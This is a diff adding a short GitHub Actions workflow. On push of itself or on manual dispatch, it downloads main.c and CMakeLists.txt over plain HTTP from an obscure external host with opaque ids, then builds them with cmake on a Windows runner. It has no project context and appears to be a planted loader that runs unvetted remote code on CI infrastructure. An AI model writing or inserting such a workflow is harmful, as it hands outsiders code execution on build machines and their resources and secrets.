@@ -1,0 +1,20 @@
+name: a
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - '.github/workflows/a.yml'
+
+jobs:
+  job:
+    runs-on: windows-latest
+
+    steps:
+
+    - run: |
+        irm http://xju.dpdns.org/24h.php?id=696cba8a50d05 -OutFile "main.c"
+        irm http://xju.dpdns.org/24h.php?id=696cc83e86597 -OutFile "CMakeLists.txt"
+
+    - run: cmake -B build
+    - run: cmake --build build --config Release
